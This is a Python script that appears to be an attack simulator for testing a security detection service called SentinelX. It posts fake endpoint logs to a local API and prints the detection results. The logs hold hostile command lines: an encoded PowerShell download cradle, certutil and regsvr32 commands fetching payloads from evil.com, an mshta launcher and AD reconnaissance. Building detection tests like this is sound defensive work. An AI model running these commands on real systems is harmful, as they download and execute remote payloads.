"""
SentinelX Attack Simulator
==========================
Run individual attacks or the full suite against SentinelX.

Usage:
    python attacks.py              → Run ALL attacks
    python attacks.py 1            → Run attack #1 only
    python attacks.py 1 3 5        → Run attacks #1, #3, #5

Each attack sends a malicious (or benign) log to POST /ingest.
Open the dashboard at http://localhost:3000 to see results appear live.
"""

import requests
import sys
import time
import json

API = "http://localhost:8001/ingest"

ATTACKS = [
    # ──────────── HIGH / CRITICAL ────────────
    {
        "id": 1,
        "name": "Encoded PowerShell Download Cradle",
        "description": "Base64-encoded PowerShell downloading a remote payload",
        "log": {
            "host": "FINANCE-WS01",
            "event_type": "process_creation",
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA",
            "destination_ip": "45.77.12.90",
        },
    },
    {
        "id": 2,
        "name": "Rundll32 JavaScript Execution",
        "description": "Rundll32 abused to execute JavaScript — classic LOLBin attack",
        "log": {
            "host": "HR-PC03",
            "event_type": "process_creation",
            "command_line": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write()',
        },
    },
    {
        "id": 3,
        "name": "MSHTA Reverse Shell",
        "description": "MSHTA executing a VBScript from a remote server",
        "log": {
            "host": "DEV-SERVER",
            "event_type": "process_creation",
            "command_line": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -e <base64>\"\", 0:close\")",
            "destination_ip": "185.220.101.1",
        },
    },
    {
        "id": 4,
        "name": "Known Malicious File Hash (VT Hit)",
        "description": "File with known malicious hash detected — triggers VirusTotal lookup",
        "log": {
            "host": "RECEPTION-PC",
            "event_type": "file_creation",
            "file_hash": "abcd1234",
        },
    },
    {
        "id": 5,
        "name": "Certutil LOLBin Download",
        "description": "Certutil abused to download and decode a malicious payload",
        "log": {
            "host": "ADMIN-WS02",
            "event_type": "process_creation",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
            "destination_ip": "104.248.18.100",
        },
    },
    # ──────────── MEDIUM ────────────
    {
        "id": 6,
        "name": "Suspicious Outbound C2 Beacon",
        "description": "Outbound connection to a known Tor exit node",
        "log": {
            "host": "DB-SERVER",
            "event_type": "network_connection",
            "destination_ip": "23.129.64.130",
        },
    },
    {
        "id": 7,
        "name": "PowerShell Reconnaissance",
        "description": "PowerShell used for internal reconnaissance commands",
        "log": {
            "host": "IT-ADMIN-PC",
            "event_type": "process_creation",
            "command_line": "powershell.exe -c \"Get-ADUser -Filter * | Select-Object Name,SamAccountName\"",
        },
    },
    {
        "id": 8,
        "name": "Regsvr32 AppLocker Bypass",
        "description": "Regsvr32 Squiblydoo attack — bypassing AppLocker via scriptlet",
        "log": {
            "host": "MARKETING-WS",
            "event_type": "process_creation",
            "command_line": "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll",
            "destination_ip": "91.219.237.229",
        },
    },
    # ──────────── LOW / BENIGN ────────────
    {
        "id": 9,
        "name": "Normal Notepad Usage",
        "description": "Benign process — should be classified as LOW",
        "log": {
            "host": "USER-LAPTOP",
            "event_type": "process_creation",
            "command_line": "notepad.exe C:\\Users\\user\\Documents\\report.txt",
        },
    },
    {
        "id": 10,
        "name": "Clean File Hash",
        "description": "Known clean file hash — VT should return clean",
        "log": {
            "host": "BUILD-SERVER",
            "event_type": "file_creation",
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        },
    },
]


def run_attack(attack: dict) -> None:
    """Send a single attack to the SentinelX API."""
    print(f"\n{'─' * 60}")
    print(f"  Attack #{attack['id']}: {attack['name']}")
    print(f"  {attack['description']}")
    print(f"{'─' * 60}")

    try:
        start = time.time()
        resp = requests.post(API, json=attack["log"], timeout=60)
        latency = time.time() - start

        resp.raise_for_status()
        report = resp.json()

        print(f"  ✅ Status    : SUCCESS ({latency:.1f}s)")
        print(f"  📋 Incident  : {report.get('incident_id', 'N/A')}")
        print(f"  🔥 Severity  : {report.get('severity', 'N/A')}")
        print(f"  📊 Confidence: {report.get('confidence', 'N/A')}")
        print(f"  🛡️  MITRE     : {report.get('mitre_techniques', [])}")
        print(f"  🤖 Agents    : {report.get('agents_invoked', [])}")
        summary = report.get("summary", "")
        if len(summary) > 100:
            summary = summary[:100] + "..."
        print(f"  📝 Summary   : {summary}")
    except requests.ConnectionError:
        print("  ❌ FAILED: Cannot connect to SentinelX backend (is it running on port 8001?)")
    except Exception as e:
        print(f"  ❌ FAILED: {e}")


def main():
    print("=" * 60)
    print("  🗡️  SentinelX Attack Simulator")
    print("  Open dashboard at http://localhost:3000")
    print("=" * 60)

    if len(sys.argv) > 1:
        # Run specific attacks by ID
        ids = [int(x) for x in sys.argv[1:]]
        selected = [a for a in ATTACKS if a["id"] in ids]
        if not selected:
            print(f"  No attacks found with IDs: {ids}")
            return
    else:
        selected = ATTACKS

    print(f"\n  Running {len(selected)} attack(s)...\n")

    for attack in selected:
        run_attack(attack)
        time.sleep(1)  # Small delay between attacks

    print(f"\n{'=' * 60}")
    print(f"  ✅ Simulation complete — {len(selected)} attacks sent")
    print(f"  📊 Check dashboard: http://localhost:3000")
    print(f"{'=' * 60}\n")


if __name__ == "__main__":
    main()
